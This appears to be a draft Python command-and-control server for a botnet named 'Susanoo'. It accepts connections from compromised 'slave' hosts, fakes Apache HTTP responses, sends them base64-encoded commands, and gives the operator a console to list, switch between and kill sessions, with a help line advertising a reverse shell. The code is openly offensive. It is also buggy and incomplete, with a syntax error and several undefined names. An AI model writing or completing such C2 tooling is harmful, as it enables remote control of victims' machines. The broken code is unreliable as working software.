#!/usr/bin/python

import socket
import sys
import os
import multiprocessing
import threading
import queue
import time
import re
import base64
import signal
import hashlib
# from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer

slaves = {}
master = {}


# Tasks Needed to be done:
#     Write code to list all available commands for clientCmdShell
#     Find a way to format output in terminal
#     Create a Cookie
#     Write code to get data from client result and store it in a queue for later examination 
#     Usage of UP and DOWN arrow keys to switch between history
#     Find a way to use dictonaries rather than queues

def nodeHash(host, port):
    return md5("%s:%d" % (host, port))


class Slave():
    def __init__(self,client):                              # initialize all the details of this class
        self.client = client
        self.hostname, self.port = client.getpeername()
        self.node_hash = nodeHash(self.hostname,self.port)
        self.parent_pipe, self.new_process = self.createConnectionProcess() 

    def killProcess(self):
        self.client.shutdown(socket.SHUT_RDWR)
        self.client.close()
        self.new_process.terminate()

    def addToQueue(self):
        while(True):
            cmd = self.child_pipe.recv()
            self.cmd_queue.put(cmd)


    def clientExecuter(self,client,child_pipe):

        self.cmd_queue = queue.Queue()
        self.pipe_thread = threading.Thread(target=self.addToQueue,args=(,))
        self.pipe_thread.start()
        while(True):
            try:    
                data = client.recv(4096)
                data = data.decode('utf-8')
                # data = data.encode('utf-8')
                # sys.stdout.write("[DEBUG] data Recieved\n{}".format(data))
                send_data = 'HTTP/1.0 200 OK\r\nServer: Apache/2.2.14 (Win32)\r\nContent-Type: text/html\r\n\r\n'
                
                if (cmd_queue.empty()):
                    cmd = "helloworld"
                else:
                    cmd = cmd_queue.get()
                cmd_byte = cmd.encode('utf-8')

                if(re.findall('POST',data[:20])):
                    send_data = send_data + 'POST request is recieved\r\n'
                    # it means this is a result of some past request
                elif(re.findall('GET',data[:20])):
                    base = base64.b64encode(cmd_byte).decode('utf-8')
                    send_data = send_data + '<html>\n<body>' + base + '</body>\n</html>\r\n'
                else:
                    send_data = send_data + 'NO Request method found\r\n'
                
                send_data = send_data.encode('utf-8')
                client.sendall(send_data)

            except Exception:
                proc_name = multiprocessing.current_process().name
                sys.stdout.write("\nConnection broken from {}:{} in {}".format(self.hostname,str(self.port),proc_name))
                break

        self.pipe_thread.join()
        self.client.shutdown(socket.SHUT_RDWR)
        self.client.close()
        # Write code to get data from pipe and add commands to queue to execute and pipe back the data from the queue which stores result


    def clientCmdShell(self):

        try:
            while(True):
                client_cmd = str(input("{}> ".format(process_list[i].name)))
                if(client_cmd == ""):
                    pass
                elif(client_cmd == "help"):
                    sys.stdout.write("yolo : exit\nlols : list commands to send\n shell : get rev shell")
                elif(client_cmd == "yolo"):
                    break
                elif(client_cmd =="lols"):
                    break
                    # Write code here to list all commands needed to send to this connection
                else:
                    self.parent_pipe.send(client_cmd)
        except Exception as ex:
                sys.stdout.write("\n[-] Unable to Read Command. Reason: {}\n".format(ex))    


    def createConnectionProcess(self):

        try:
            self.parent_pipe, self.child_pipe = multiprocessing.Pipe()        # Creating Pipe for connection to new processes
            # parent_pipe_list.append(parent_pipe)                    # Appended to list to keep track of parent pipes
            # host_list.append(client_addr[0])
            # port_list.append(client_addr[1])
            self.new_process = multiprocessing.Process(target=self.clientExecuter,args=(self.client,self.child_pipe))
            # process_list.append(new_process)
            self.new_process.start()
            sys.stdout.write("\n[+] {}:{} connected as {}".format(self.hostname,str(self.port),self.new_process.name))
            # Created new process for every connection that I get and save the process in process_list
            return self.parent_pipe, self.new_process
        except Exception as ex:
            sys.stdout.write("\n[-] Unable to Create New Process for this Connection {}:{}. Reason: {}\n".format(self.hostname,str(self.port),ex))



def switch(process_name):

    try:
        flag = 0
        i = 0
        for i in range(len(process_list)):
            if(process_list[i].name == process_name):
                flag = 1
                break
        if(flag == 0):
            sys.stdout.write("No process found by the name: {}".format(process_name))
        else:
            clientCmdShell(i)
    except Exception as ex:
            sys.stdout.write("\n[-] Unable to Switch Process. Reason: {}\n".format(ex))



def handlerExecuter(cmd):

    try:
        if(cmd[:4]=='kill'):    # kill specified connection
            proc_name = cmd[5:]
            flag = 0
            for i in range(len(process_list)):
                if(process_list[i].name == proc_name):
                    process_list[i].terminate()
                    del process_list[i]
                    del parent_pipe_list[i]
                    del port_list[i]
                    del host_list[i]
                    sys.stdout.write("[+] Process " + proc_name + " is terminated\n")
                    flag = 1
                    break
            if(flag == 0):
                sys.stdout.write("[-] Process not found\n")
        elif(cmd[:7]=="killall"):   # kill all conntections
            flag = 0
            for i in range(len(process_list)):
                flag = 1
                proc_name = process_list[i].name
                process_list[i].terminate()
                del process_list[i]
                del parent_pipe_list[i]
                del host_list[i]
                del port_list[i]
                sys.stdout.write("[+] Process " + proc_name + " is terminated\n")
            if(flag == 0):
                sys.stdout.write("[-] Process not found\n")
        elif(cmd[:4] == "list"):    # list all the connected hosts
            # sys.stdout.write("[DEBUG] inside list")
            for i in range(len(process_list)):
                proc_name = process_list[i].name
                hostname = host_list[i]
                port = port_list[i]
                sys.stdout.write("{} => {}:{}".format(proc_name,hostname,port))
        elif(cmd[:6] == "switch"):
            process_name = cmd[7:]
            switch(process_name)
            # sys.stdout.write("[DEBUG] switch")
        else:
            sys.stdout.write("\nCOMMANDS:\nlist\t\t\t:\tto list all the connected devices\nkill {processname}\t:\tkill the specified connection\nkillall\t\t\t:\tkill all connected\nswitch {processname}\t:\tswitch to different connection\n")
    except Exception as ex:
            sys.stdout.write("\n[-] Unable to execute Commands. Reason: {}\n".format(ex))


def ctrlCHandler(signum, frame):
    sys.stdout.write("\nctrl-c is pressed to exit type \'exit\'")

def handlerCmdShell():

    try:
        while(True):
            handler_cmd = str(input("Susanoo> "))
            if(handler_cmd == ""):
                pass
            elif(handler_cmd == "exit"):
                sys.stdout.write("[+] Killing all running processes\n")
                for slave in slaves:
                    time.sleep(0.1)
                    slave.killProcess()
                time.sleep(2)
                os._exit(0)
                # Close all the process one by one and exit the program after that
            else:
                handlerExecuter(handler_cmd)
    except Exception as ex:
            sys.stdout.write("\n[-] Unable to start a handlerCmdShell. Reason: {}\n".format(ex))
            os._exit(0)





def listener(lhost,lport):

    try:
        signal.signal(signal.SIGINT,ctrlCHandler)
        sock = socket.socket()
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((lhost,lport))
        sock.listen(100)
        # Started the listener which can handle 100 connections.
        sys.stdout.write ("[+] Starting Botnet listener on tcp://" + lhost + ":" + str(lport) + "\n")
            
        handler_cmd_thread = threading.Thread(target=handlerCmdShell,args=())
        handler_cmd_thread.start()
        # Handler cmd shell started here.
        # It is running as serperate thread to give us an free cmd shell while listener runs in background.
        connection_count = 0
        while(len(process_list)<100):
            (client,client_addr) = sock.accept()
            for i in slaves.keys():         # checking if connection already exists for this client
                slave = slaves[i]
                if slave.hostname == client_addr[0]:
                    repeat = True
                    break
            if repeat:
                sys.stdout.write("[-] Same Connection Detected\n")
                client.shutdown(socket.SHUT_RDWR)
                client.close()
            else:
                slave = Slave(client)
                slaves[connection_count] = slave
                connection_count = connection_count + 1
                # Created new object in class slave and stored in dictonary slaves for every connection

        sock.shutdown(socket.SHUT_RDWR)
        sock.close()
    except Exception as ex:
            sys.stdout.write("\n[-] Unable to start a listener. Reason: {}\n".format(ex))
            os._exit(0)


def main():
    if(len(sys.argv) < 3):
        sys.stdout.write("[!] Useage:\n[+] python {sys.argv[0]} LHOST LPORT\n")
    else:
        try:
            lhost = sys.argv[1]
            lport = int(sys.argv[2])
            listener(lhost,lport)

        except Exception as ex:
            sys.stdout.write("\n[-] Unable to start a handler. Reason: {}\n".format(ex))
            # exit(0)



if __name__ == '__main__':
    main()